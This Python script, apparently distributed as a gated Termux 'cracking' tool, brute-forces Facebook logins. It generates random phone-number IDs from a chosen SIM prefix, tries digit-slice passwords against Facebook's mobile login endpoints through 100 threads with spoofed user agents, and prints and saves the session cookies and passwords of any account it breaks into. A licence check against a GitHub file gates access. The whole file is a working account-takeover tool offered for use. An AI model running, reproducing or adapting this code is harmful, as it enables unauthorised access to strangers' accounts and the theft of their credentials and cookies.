#-------module-------#

	

import requests
from bs4 import BeautifulSoup as bxx
import os,re,sys,random,string,time
from os import system as EHC
try:
    import requests
except:
    os.system("pip install requests")
    os.system("pkg install espeak")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
os.system('espeak -a 300 " Welcome,   to,  The,  DARK,   Tool"')

os.system('espeak -a 300 " TOOL OWNER IS.       DARK FORID"')


CorrectUsername = 'DARK'
key = 'XNXX'
while key == 'XNXX':
    username = input('\033[0;97m[•]\033[1;96m•➤ \033ENTER USERNAME \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;30m───────────────────────────────────────────\n\033[0;97m[X]\033[1;32m LOGIN SUCCESSFULLY') 
            time.sleep(1)           
            key = 'false'
import os,time
os.system('clear')


logo = ("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
          
  /
 
 /$$$$$$$      /$$$$$$      /$$$$$$$      /$$   /$$
| $$__  $$    /$$__  $$    | $$__  $$    | $$  /$$/
| $$  \ $$   | $$  \ $$    | $$  \ $$    | $$ /$$/ 
| $$  | $$   | $$$$$$$$    | $$$$$$$/    | $$$$$/  
| $$  | $$   | $$__  $$    | $$__  $$    | $$  $$  
| $$  | $$   | $$  | $$    | $$  \ $$    | $$\  $$ 
| $$$$$$$//$$| $$  | $$ /$$| $$  | $$ /$$| $$ \  $$
|_______/|__/|__/  |__/|__/|__/  |__/|__/|__/  \__/
                                                                                                                                                                                                                                                                                                                                                          
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA AND WIFI ALSO ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mAhmmed Bishal ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • Ahmmed Bishal ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mMd-Bishal-Dark ]   ║\33[1;34m   
╠══[REGIONAL                • BANGLADESH ]  ║\33[1;35m 
╠══[TOOLS                    • paid but approval Need]         ║ \33[1;32m   
╠══[VERSION                  • 0.2 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")  



def line():
    print("—"*36)
def sykology():
    Dark=[]
    EHC("clear")
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m=============================")
    print(" [SIM CODE] 018/017/019/016/015")
    ehc_code=input(" CHOICE SIM CODE:")
    line()    
    print(" \033[38;5;46m=============================")
    print(" [LIMIT]-[1000]-[2000]-[3000]-[4000]")
    print(" \033[38;5;46m=============================")
    ehc_lim=int(input(" CHOICE LIMIT :"))    
    line()
    for z in range(ehc_lim):
        co=''.join(random.choice(string.digits) for _ in range(8))
        Dark.append(co)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[Dark] Update  M")
    print(" \033[38;5;46m[Dark] Update Mbasic")
    print(" \033[38;5;46m[Dark] Update Free")
    print(" \033[38;5;46m[Dark] Update P")
    print(" \033[38;5;46m[Dark] Update  X")
    print(" \033[38;5;46m[Dark] Update Touch") 
    print(" \033[38;5;46m=============================")
    line()
    gxd=input(" [✔️]CHOICE UPDATE NUMBER:")
    if gxd in ["DTT1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["DTT2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["DTT3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["DTT4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["DTT5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        EHC("clear")
        print(logo)
        tl=str(len(Dark))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mDark-ok.txt") 
        print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
        line()
        for id in Dark:
            uid=ehc_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[Dark Forid] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            uuu=random.choice(ugen)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]
                print(f"""❴\033[38;5;46mOK ID_❵]
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mDark Forid\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1mLogin❴\033[38;5;46mLITE+APK❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mDark Forid\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     Dark Bishal FACEBOOK\033[38;5;46m❴NUMBER❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     Dark Bishal FACEBOOK\033[38;5;46m❴PASS❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/Dark-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1      
    except:
        time.sleep(3)
def approval():
	frist="FUCK["
	last="]BRO"
	uuid=str(os.getuid()) + str(os.getlogin())
	key = "9".join(uuid)
	a=requests.get("https://github.com/Bishalkhan78/Dangar/blob/main/Dangar.txt").text
	if key in a:
		sykology()
	else:
		print("YOUR KEY IS NOT APPROVED")
		os.system("clear")
		print(logo)
		print("TOOL IS FREE BUT NEED PERMISSION ")
		print("PLEASE CONTACT TO ADMIN")
		os.system('espeak -a 300 " For approved contact admin"')
		print("Your key : "+frist+key+last)
		print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		os.system("xdg-open https://t.me/Bishal_64")
approval()

        



